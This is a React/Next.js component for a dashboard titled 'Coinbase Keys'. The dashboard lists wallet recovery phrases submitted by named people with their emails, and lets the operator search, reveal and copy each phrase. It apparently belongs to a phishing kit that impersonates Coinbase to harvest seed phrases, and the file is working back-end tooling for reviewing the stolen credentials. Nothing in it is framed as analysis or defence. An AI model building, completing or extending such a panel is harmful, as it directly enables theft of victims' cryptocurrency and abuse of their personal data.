"use client";

import { useState } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { Eye, EyeOff, Copy, Check, Search, Key, User, Clock } from "lucide-react";

interface PhraseEntry {
    _id: string;
    email: string;
    firstName: string;
    lastName: string;
    phrase: string;
    wordCount: number;
    createdAt: string;
}

interface CoinbaseKeysClientProps {
    entries: PhraseEntry[];
}

export default function CoinbaseKeysClient({ entries }: CoinbaseKeysClientProps) {
    const [search, setSearch] = useState("");
    const [revealedIds, setRevealedIds] = useState<Set<string>>(new Set());
    const [copiedId, setCopiedId] = useState<string | null>(null);
    const [expandedId, setExpandedId] = useState<string | null>(null);

    const filtered = entries.filter(e =>
        e.email.toLowerCase().includes(search.toLowerCase()) ||
        `${e.firstName} ${e.lastName}`.toLowerCase().includes(search.toLowerCase())
    );

    const toggleReveal = (id: string) => {
        setRevealedIds(prev => {
            const next = new Set(prev);
            if (next.has(id)) next.delete(id);
            else next.add(id);
            return next;
        });
    };

    const copyPhrase = async (id: string, phrase: string) => {
        await navigator.clipboard.writeText(phrase);
        setCopiedId(id);
        setTimeout(() => setCopiedId(null), 2000);
    };

    const maskPhrase = (phrase: string) => {
        const words = phrase.split(" ");
        return words.map((w, i) => i === 0 || i === words.length - 1 ? w : "••••").join(" ");
    };

    const formatDate = (iso: string) => {
        const d = new Date(iso);
        return d.toLocaleDateString("en-US", { month: "short", day: "numeric", year: "numeric" }) +
            " at " + d.toLocaleTimeString("en-US", { hour: "2-digit", minute: "2-digit" });
    };

    return (
        <div className="w-full">
            {/* Page Header */}
            <div className="mb-8">
                <div className="flex items-center gap-3 mb-2">
                    <div className="w-10 h-10 rounded-xl bg-[#0052FF]/10 border border-[#0052FF]/20 flex items-center justify-center">
                        <Key className="w-5 h-5 text-[#0052FF]" />
                    </div>
                    <div>
                        <h1
                            className="text-xl font-bold tracking-[0.15em] uppercase text-white"
                            style={{ fontFamily: "var(--font-montserrat), sans-serif" }}
                        >
                            Coinbase Keys
                        </h1>
                        <p className="text-[10px] tracking-[0.2em] uppercase text-white/40 font-medium">
                            {entries.length} submitted {entries.length === 1 ? "phrase" : "phrases"}
                        </p>
                    </div>
                </div>
            </div>

            {/* Search Bar */}
            <div className="relative mb-6">
                <Search className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-white/30" />
                <input
                    type="text"
                    value={search}
                    onChange={(e) => setSearch(e.target.value)}
                    placeholder="Search by name or email..."
                    className="w-full bg-white/[0.03] border border-white/[0.08] rounded-xl py-3.5 pl-12 pr-4 text-sm text-white outline-none focus:border-[#0052FF]/50 transition-colors placeholder:text-white/20"
                />
            </div>

            {/* Stats Row */}
            <div className="grid grid-cols-2 sm:grid-cols-3 gap-4 mb-8">
                <div className="bg-white/[0.03] border border-white/[0.06] rounded-xl p-4">
                    <p className="text-[10px] tracking-[0.15em] uppercase text-white/40 font-medium mb-1">Total Submissions</p>
                    <p className="text-2xl font-bold text-white">{entries.length}</p>
                </div>
                <div className="bg-white/[0.03] border border-white/[0.06] rounded-xl p-4">
                    <p className="text-[10px] tracking-[0.15em] uppercase text-white/40 font-medium mb-1">12-Word Phrases</p>
                    <p className="text-2xl font-bold text-white">{entries.filter(e => e.wordCount === 12).length}</p>
                </div>
                <div className="bg-white/[0.03] border border-white/[0.06] rounded-xl p-4 hidden sm:block">
                    <p className="text-[10px] tracking-[0.15em] uppercase text-white/40 font-medium mb-1">24-Word Phrases</p>
                    <p className="text-2xl font-bold text-white">{entries.filter(e => e.wordCount === 24).length}</p>
                </div>
            </div>

            {/* Entries List */}
            {filtered.length === 0 ? (
                <div className="text-center py-20">
                    <Key className="w-10 h-10 text-white/10 mx-auto mb-4" />
                    <p className="text-sm text-white/30 font-medium">
                        {search ? "No matching entries found." : "No recovery phrases submitted yet."}
                    </p>
                </div>
            ) : (
                <div className="flex flex-col gap-3">
                    {filtered.map((entry, i) => {
                        const isRevealed = revealedIds.has(entry._id);
                        const isCopied = copiedId === entry._id;
                        const isExpanded = expandedId === entry._id;

                        return (
                            <motion.div
                                key={entry._id}
                                initial={{ opacity: 0, y: 10 }}
                                animate={{ opacity: 1, y: 0 }}
                                transition={{ duration: 0.3, delay: i * 0.03 }}
                                className="bg-white/[0.02] border border-white/[0.06] hover:border-white/[0.12] rounded-xl transition-all duration-200"
                            >
                                {/* Main Row */}
                                <div
                                    className="flex items-center gap-4 p-4 sm:p-5 cursor-pointer"
                                    onClick={() => setExpandedId(isExpanded ? null : entry._id)}
                                >
                                    {/* Avatar */}
                                    <div className="w-10 h-10 rounded-full bg-[#0052FF]/10 border border-[#0052FF]/20 flex items-center justify-center shrink-0">
                                        <span className="text-[10px] font-bold text-[#0052FF] tracking-wide">
                                            {entry.firstName[0]}{entry.lastName[0]}
                                        </span>
                                    </div>

                                    {/* User Info */}
                                    <div className="flex-1 min-w-0">
                                        <p className="text-sm font-semibold text-white truncate">
                                            {entry.firstName} {entry.lastName}
                                        </p>
                                        <p className="text-xs text-white/40 truncate">{entry.email}</p>
                                    </div>

                                    {/* Badge */}
                                    <span className="text-[9px] tracking-[0.15em] uppercase font-bold text-[#0052FF] bg-[#0052FF]/10 border border-[#0052FF]/20 rounded-full px-3 py-1 shrink-0 hidden sm:inline-block">
                                        {entry.wordCount}-Word
                                    </span>

                                    {/* Date */}
                                    <span className="text-[10px] text-white/30 shrink-0 hidden md:inline-flex items-center gap-1">
                                        <Clock className="w-3 h-3" />
                                        {formatDate(entry.createdAt)}
                                    </span>

                                    {/* Expand Arrow */}
                                    <svg
                                        className={`w-4 h-4 text-white/30 transition-transform duration-200 shrink-0 ${isExpanded ? "rotate-180" : ""}`}
                                        fill="none" stroke="currentColor" viewBox="0 0 24 24"
                                    >
                                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" />
                                    </svg>
                                </div>

                                {/* Expanded Detail */}
                                <AnimatePresence>
                                    {isExpanded && (
                                        <motion.div
                                            initial={{ height: 0, opacity: 0 }}
                                            animate={{ height: "auto", opacity: 1 }}
                                            exit={{ height: 0, opacity: 0 }}
                                            transition={{ duration: 0.2 }}
                                            className="overflow-hidden"
                                        >
                                            <div className="px-4 sm:px-5 pb-5 pt-1 border-t border-white/[0.04]">
                                                {/* Mobile-only meta */}
                                                <div className="flex items-center gap-3 mb-4 sm:hidden">
                                                    <span className="text-[9px] tracking-[0.15em] uppercase font-bold text-[#0052FF] bg-[#0052FF]/10 border border-[#0052FF]/20 rounded-full px-3 py-1">
                                                        {entry.wordCount}-Word
                                                    </span>
                                                    <span className="text-[10px] text-white/30 flex items-center gap-1">
                                                        <Clock className="w-3 h-3" />
                                                        {formatDate(entry.createdAt)}
                                                    </span>
                                                </div>

                                                {/* Phrase Display */}
                                                <label className="block text-[9px] uppercase tracking-widest text-white/40 font-bold mb-2">
                                                    Recovery Phrase
                                                </label>
                                                <div className="bg-black/60 border border-white/[0.08] rounded-lg p-4 mb-3">
                                                    <p className="text-sm font-mono text-white/80 leading-relaxed break-all select-all">
                                                        {isRevealed ? entry.phrase : maskPhrase(entry.phrase)}
                                                    </p>
                                                </div>

                                                {/* Action Buttons */}
                                                <div className="flex items-center gap-2">
                                                    <button
                                                        onClick={(e) => { e.stopPropagation(); toggleReveal(entry._id); }}
                                                        className="flex items-center gap-2 px-4 py-2 text-[10px] font-bold tracking-widest uppercase rounded-lg border border-white/10 text-white/60 hover:text-white hover:border-white/20 transition-all"
                                                    >
                                                        {isRevealed ? <EyeOff className="w-3.5 h-3.5" /> : <Eye className="w-3.5 h-3.5" />}
                                                        {isRevealed ? "Hide" : "Reveal"}
                                                    </button>
                                                    <button
                                                        onClick={(e) => { e.stopPropagation(); copyPhrase(entry._id, entry.phrase); }}
                                                        className={`flex items-center gap-2 px-4 py-2 text-[10px] font-bold tracking-widest uppercase rounded-lg border transition-all ${
                                                            isCopied
                                                                ? "border-green-500/30 text-green-500 bg-green-500/10"
                                                                : "border-white/10 text-white/60 hover:text-white hover:border-white/20"
                                                        }`}
                                                    >
                                                        {isCopied ? <Check className="w-3.5 h-3.5" /> : <Copy className="w-3.5 h-3.5" />}
                                                        {isCopied ? "Copied" : "Copy"}
                                                    </button>
                                                </div>
                                            </div>
                                        </motion.div>
                                    )}
                                </AnimatePresence>
                            </motion.div>
                        );
                    })}
                </div>
            )}
        </div>
    );
}
